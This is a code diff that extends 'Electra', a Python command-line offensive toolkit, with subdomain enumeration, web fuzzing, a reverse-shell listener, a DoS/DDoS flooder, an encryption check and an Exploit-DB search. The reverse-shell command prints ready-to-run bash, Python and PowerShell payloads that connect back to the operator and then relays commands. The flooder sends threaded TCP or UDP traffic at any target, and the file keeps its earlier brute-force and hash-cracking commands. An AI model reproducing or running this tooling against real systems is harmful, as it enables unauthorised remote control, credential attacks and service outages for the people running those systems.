@@ -1,12 +1,15 @@
 #!/usr/bin/env python3
 import pymongo.errors
-import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3
+import dns.resolver
+import concurrent.futures
+import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl
 #import telnetlib (Deprecated in python 3.13)
 import requests.auth
 from smbprotocol.connection import Connection
 from smbprotocol.session import Session
 import vncdotool.api
 from hashid import HashID
+from bs4 import BeautifulSoup
 
 BANNER = """
 ███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
@@ -14,7 +17,7 @@ BANNER = """
 █████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
 ██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
 ███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
-═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.1
+═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.2
 
 Electra - The master plan plotter.
 """
@@ -34,7 +37,13 @@ class BannerGroup(click.Group):
             ("hashgen", "Generate hash of a specific password."),
             ("hashcrk", "Crack a hash or a list of hashes."),
             ("srvatk", "Services Dictionary Password Brute Force attack."),
-            ("webatk", "Web (Basic & Digest) Username/Password Brute Force attack.")
+            ("webatk", "Web (Basic & Digest) Username/Password Brute Force attack."),
+            ("subenum", "Subdomain enumeration (Passive & Active)."),
+            ("fuzz", "Fuzz directories and files."),
+            ("revsh", "Reverse Shell Handler."),
+            ("netstr", "Perform DoS/DDoS attack."),
+            ("encheck", "Perform service encryption analysis."),
+            ("exploit", "Search an exploit.")
         ]
         with formatter.section("Commands"):
             for cmd, desc in commands:
@@ -522,6 +531,316 @@ def webatk(url, username, user_wordlist, pass_wordlist, auth_method):
     except requests.RequestException as e:
         click.echo(click.style(f"[!] Request Error: {e}. Connection to: {url} failed.", fg="red"))
     except FileNotFoundError as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+
+#SUBENUM COMMAND
+@cli.command()
+@click.option("-d", "--domain", required=True, help="Target domain for subdomain enumeration.")
+@click.option("-p", "--passive", is_flag=True, help="Passive subdomain enumeration.")
+@click.option("-a", "--active", is_flag=True, help="DNS brute forcing for subdomain enumeration.")
+@click.option("-w", "--wordlist", default="subdomains.txt", help="Path to wordlist for brute forcing.")
+def subenum(domain, passive, active, wordlist):
+    click.echo(click.style(f"[*] Starting subdomain enumeration for: {domain}", fg="blue"))
+    results = []
+    #Passive enumeration
+    if passive:
+        click.echo(click.style(f"[*] Executing passive subdomain enumeration...", fg="blue"))
+        passive_results = passive_enum(domain)
+        click.echo(click.style(f"[!] Passive Subdomain Enumeration results: {passive_results}", fg="green"))
+        #Friendly output
+        #for sub in passive_results:
+        #    click.echo(click.style(f"{sub}", fg="green"))
+    
+    #DNS BF enumeration
+    if active:
+        click.echo(click.style(f"[*] Executing DNS Brute Force enumeration...", fg="blue"))
+        active_results = active_enum(domain, wordlist)
+        click.echo(click.style(f"[!] Active Subdomain Enumeration results: {active_results}", fg="green"))
+        #Friendly output
+        #for sub, ip in active_results:
+        #    click.echo(click.style(f"{sub} on {ip}", fg="green"))
+    
+    if not passive and not active:
+        click.echo(click.style(f"[!] Option -p (passive) or -a (active) is required.", fg="magenta"))
+        return
+    
+    save_results(domain, results)
+
+def passive_enum(domain):
+    subdomains = []
+    try:
+        response = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}")
+        if response.status_code == 200:
+            subdomains = [line.split(",")[0] for line in response.text.splitlines()]
+            click.echo(click.style(f"[!] Found {len(subdomains)} subdomains using passive enumeration.", fg="green"))
+        else:
+            click.echo(click.style(f"[!] Error: Could not retrieve data from source", fg="red"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Passive enumeration failed: {e}", fg="red"))
+    return subdomains
+
+def active_enum(domain, wordlist):
+    subdomains = []
+    resolver = dns.resolver.Resolver()
+    try:
+        with open(wordlist, "r") as file:
+            for subdomain in file:
+                subd = f"{subdomain.strip()}.{domain}"
+                try:
+                    results = resolver.resolve(subd, "A")
+                    for result in results:
+                        subdomains.append((subd, result.to_text()))
+                        click.echo(click.style(f"[!] Found subdomain: {subd} on {result.to_text()}", fg="green"))
+                except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout):
+                    continue
+    except FileNotFoundError:
+        click.echo(click.style(f"[!] Error: Wordlist '{wordlist}' not found", fg="red"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Active enumeration failed: {e}", fg="red"))
+    return subdomains
+
+def save_results(domain, results):
+    try:
+        with open("Electra-Found-Subdomains.txt", "a") as file:
+            file.write(f"Domain: {domain}\n")
+            file.write("Subdomain Enumeration Results:")
+            for result in results:
+                if len(result) == 1:
+                    subdomain, enum_type = result
+                    file.write(f"{subdomain} (Type: {enum_type})")
+                elif len(result) == 2:
+                    subdomain, enum_type, ip = result
+                    file.write(f"{subdomain} on {ip} (Type: {enum_type})")
+        click.echo(click.style(f"[!] Results successfully saved to Electra-Found-Subdomains.txt.", fg="green"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error: Could not save results to file. {e}", fg="red"))
+
+#FUZZ COMMAND
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL to fuzz.")
+@click.option("-w", "--wordlist", required=True, type=click.Path(exists=True), help="Wordlist file for attack.")
+@click.option("-pw", "--param-wordlist", type=click.Path(exists=True), help="Wordlist for parameter names.")
+@click.option("-vw", "--value-wordlist", type=click.Path(exists=True), help="Wordlist for parameter values.")
+@click.option("-e", "--extensions", default=None, help="Comma-Nospace-Seperated list of extensions to test. Default = .php,.html,.bak")
+@click.option("-c", "--concurrency", default=5, type=int, help="Number of concurrent requests. Default = 5")
+@click.option("-m", "--method", default="GET", type=click.Choice(["GET", "POST"], case_sensitive=False), help="HTTP method to use. Default = GET")
+@click.option("-s", "--status", default="200", help="Comma-seperated status codes to display. Default = 200")
+@click.option("-t", "--timeout", default=5, type=int, help="Timeout for each request in seconds. Default = 5")
+def fuzz(url, wordlist, param_wordlist, value_wordlist, extensions, concurrency, method, status, timeout):
+    valid_status_codes = [int(code.strip()) for code in status.split(",")]
+    extension_list = extensions.split(",") if extensions else [""]
+    try:
+        with open(wordlist, "r") as file:
+            words = [line.strip() for line in file]
+        params = []
+        values = []
+        if param_wordlist:
+            with open(param_wordlist, "r") as file:
+                params = [line.strip() for line in file]
+        if value_wordlist:
+            with open(value_wordlist, "r") as file:
+                values = [line.strip() for line in file]
+    except FileNotFoundError as e:
+        click.echo(click.style(f"[!] Wordlist not found. {e}", fg="red"))
+        return
+    
+    def fuzz_path(path):
+        for ext in extension_list:
+            full_url = f"{url}/{path}{ext}"
+            try:
+                response = requests.request(method, full_url, timeout=timeout)
+                if response.status_code in valid_status_codes:
+                    click.echo(click.style(f"[!] Found: {full_url} (Status: {response.status_code})", fg="green"))
+            except requests.RequestException:
+                click.echo(click.style(f"[!] Error visiting {full_url}", fg="red"))
+    
+    def fuzz_params():
+        for param in params:
+            for value in values:
+                param_url = f"{url}?"
+                param_data = {param: value}
+                try:
+                    if method.upper() == "GET":
+                        response = requests.get(param_url, params=param_data, timeout=timeout)
+                    elif method.upper() == "POST":
+                        response = requests.get(param_url, params=param_data, timeout=timeout)
+                    if response.status_code in valid_status_codes:
+                        click.echo(click.style(f"[!] Parameter found: {param}={value} (Status: {response.status_code})", fg="green"))
+                except requests.RequestException:
+                    click.echo(click.style(f"[!] Error trying with parameter: {param}={value}", fg="red"))
+    
+    click.echo(click.style(f"[*] Starting fuzzing on {url} with {concurrency} concurrent threads...", fg="blue"))
+    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
+        executor.map(fuzz_path, words)
+        if params and values:
+            executor.submit(fuzz_params)
+    click.echo(click.style("[*] Fuzzing completed.", fg="blue"))
+
+#REVSH COMMAND
+@cli.command()
+@click.option("-h", "--host", required=True, help="IP address to listen on for incoming connections.")
+@click.option("-p", "--port", required=True, type=int, help="Port number to listen on.")
+@click.option("-t", "--type", type=click.Choice(["bash", "python", "powershell"]), required=True, help="Type of reverse shell.")
+@click.option("-a", "--arch", type=click.Choice(["x86", "x64"]), default="x64", help="Architecture of the payload. Default = x64")
+def revsh(host, port, type, arch):
+    click.echo(click.style(f"[*] Setting a {type} reverse shell listener on {host}:{port} for {arch}...", fg="blue"))
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(1)
+    click.echo(click.style(f"[!] Listening on {host}:{port} ...", fg="green"))
+    try:
+        conn, addr = server_socket.accept()
+        click.echo(click.style(f"[+] Connection received from {addr}", fg="green"))
+        if type == "bash":
+            click.echo(click.style(f"[!] Payload to execute on target:\nbash -i >& /dev/tcp/{host}/{port} 0>&1", fg="yellow"))
+        elif type == "python":
+            click.echo(click.style(f"[!] Payload to execute on target:\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", fg="yellow"))
+        elif type == "powershell":
+            if arch == "x64":
+                click.echo(click.style(f"[!] Payload to execute on target:\n$client = New-Object System.Net.Sockets.TCPClient(\"{host}\", {port});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()", fg="yellow"))
+            else:
+                click.echo(click.style(f"[!] Payload to execute on target:\n", fg="yellow"))
+        
+        while True:
+            command = input(f"{addr}> ")
+            if command.lower() in ("exit", "quit"):
+                conn.send(b"exit\n")
+                click.echo(click.style(f"[!] Connection terminated.", fg="magenta"))
+                break
+            conn.send(command.encode() + b"\n")
+            response = conn.recv(4096)
+            click.echo(click.style(response.decode()))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+    finally:
+        conn.close()
+        server_socket.close()
+        click.echo(click.style(f"[!] Listener terminated.", fg="magenta"))
+
+#NETSTR COMMAND
+@cli.command()
+@click.option("-h", "--host", required=True, help="Target IP or hostname.")
+@click.option("-p", "--port", default=443, type=int, help="Target port. Default = 443")
+@click.option("-c", "--count", default=1000, type=int, help="Number of requests/packets to send. Default = 1000")
+@click.option("-t", "--threads", default=10, type=int, help="Number of concurrent threads. Default = 10")
+@click.option("-d", "--delay", default=0.0, type=float, help="Delay between requests/packets in seconds. Default = 0.0")
+@click.option("-u", "--udp", is_flag=True, help="Perform a UDP attack instead of TCP.")
+@click.option("-f", "--file", type=click.Path(exists=True), help="Path to payload file.")
+def netstr(host, port, count, threads, delay, udp, file):
+    if file:
+        with open(file, "rb") as f:
+            payload = f.read()
+        click.echo(click.style(f"[!] Successfully loaded payload from {file}.", fg="green"))
+    else:
+        payload = b"A * 1024" #Default dummy payload
+        click.echo(click.style(f"[!] Using default payload", fg="green"))
+
+    click.echo(click.style(f"[*] Performing {'UDP' if udp else 'TCP'} DoS/DDoS attack on {host}:{port} ...", fg="blue"))
+    def send():
+        for _ in range(count // threads):
+            try:
+                if udp:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.sendto(payload, (host, port))
+                else:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.connect((host, port))
+                    #sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
+                    sock.send(payload)
+                sock.close()
+                time.sleep(delay)
+            except Exception as e:
+                click.echo(click.style(f"[!] Error: {e}", fg="red"))
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(send) for _ in range(threads)]
+        for future in concurrent.futures.as_completed(futures):
+            if future.exception():
+                click.echo(click.style(f"[!] Thread error: {future.exception()}", fg="red"))
+    
+    click.echo(click.style(f"DoS/DDoS attack completed.", fg="green"))
+
+#ENCHECK COMMAND
+@cli.command()
+@click.option("-s", "--service", type=click.Choice(["http", "ftp", "imap", "pop3", "smtp"], case_sensitive=False), help="Service to analyze.")
+@click.option("-h", "--host", required=True, help="IP or host of the target service.")
+@click.option("-p", "--port", type=int, help="Port of the target service.")
+def encheck(service, host, port):
+    click.echo(click.style(f"[*] Starting encryption analysis for {service.upper()} on {host}:{port} ...", fg="blue"))
+    try:
+        if service.lower() == "http":
+            port = port or 80
+            try:
+                response = requests.get(f"http://{host}:{port}", timeout=5)
+                click.echo(click.style(f"[!] HTTP service detected on {host}:{port}. Insecure protocol.", fg="green"))
+            except requests.exceptions.SSLError:
+                click.echo(click.style(f"[!] HTTPS service detected on {host}:{port}. Secure protocol.", fg="yellow"))
+        elif service.lower() == "ftp":
+            port = port or 21
+            with ftplib.FTP() as ftp:
+                ftp.connect(host, port, timeout=5)
+                click.echo(click.style(f"[!] FTP service detected on {host}:{port}. Insecure protocol.", fg="green"))
+        elif service.lower() in ["imap", "pop3", "smtp"]:
+            port = port or {"imap": 143, "pop3": 110, "smtp": 25}[service.lower()]
+            secure_ports = {"imap": 993, "pop3": 995, "smtp": 465}[service.lower()]
+            try:
+                context = ssl.create_default_context()
+                with socket.create_connection((host, port), timeout=5) as sock:
+                    with context.wrap_socket(sock, server_hostname=host) as secure_sock:
+                        click.echo(click.style(f"[!] {service.upper()} on {host}:{port} supports TLS/SSL. Secure protocol.", fg="yellow"))
+            except ssl.SSLError:
+                click.echo(click.style(f"[!] {service.upper()} on {host}:{port} does not support TLS/SSL. Insecure protocol.", fg="green"))
+            except Exception as e:
+                click.echo(click.style(f"[!] Error analyzing {service.upper()} on {host}:{port}. {e}", fg="red"))
+        else:
+            click.echo(click.style(f"[!] Unsupported service: {service}", fg="red"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+
+#EXPLOIT COMMAND
+@cli.command()
+@click.option("-q", "--query", required=True, help="Search query (Name, CVE or Version).")
+@click.option("-o", "--output", type=click.Path(), help="Path to save the results.")
+def exploit(query, output):
+    click.echo(click.style(f"[*] Searching for exploits related to: {query} ...", fg="blue"))
+    try:
+        url = f"https://www.exploit-db.com/search?q={query}"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1 Edg/130.0.0.0"
+        }
+        response = requests.get(url, headers=headers) #headers = headers
+        if response.status_code != 200:
+            click.echo(click.style(f"[!] Failed to fetch exploit data.", fg="red"))
+            return
+        
+        bs = BeautifulSoup(response.text, "html.parser")
+        results = []
+        for row in bs.select("exploits-table_info"): #table.table-results tbody tr
+            cols = row.find_all("td")
+            if len(cols) > 2 and cols[1].find("a"):
+                exploit_title = cols[1].text.strip()
+                exploit_date = cols[2].text.strip()
+                exploit_link = "https://www.exploit-db.com" + cols[1].find("a")["href"]
+                results.append((exploit_title, exploit_date, exploit_link))
+            #else:
+            #    continue
+        
+        if not results:
+            click.echo(click.style(f"[!] No exploits found for the provided query.", fg="magenta"))
+            return
+        click.echo(click.style(f"[!] Found exploits:", fg="green"))
+        for id, (title, date, link) in enumerate(results, 1):
+            click.echo(click.style(f"[{id}] {title} ({date}) - {link}", fg="yellow"))
+        
+        if output:
+            with open("Electra-Exploit-Search.txt", "a") as file:
+                for title, date, link in results:
+                    file.write(f"{title} ({date}) - {link}\n")
+            click.echo(click.style(f"[!] Successfully saved results to {output}", fg="green"))
+    
+    except requests.RequestException as e:
+        click.echo(click.style(f"[!] Error connecting to ExploitDB: {e}", fg="red"))
+    except Exception as e:
         click.echo(click.style(f"[!] Error: {e}", fg="red"))
 
 if __name__ == "__main__":
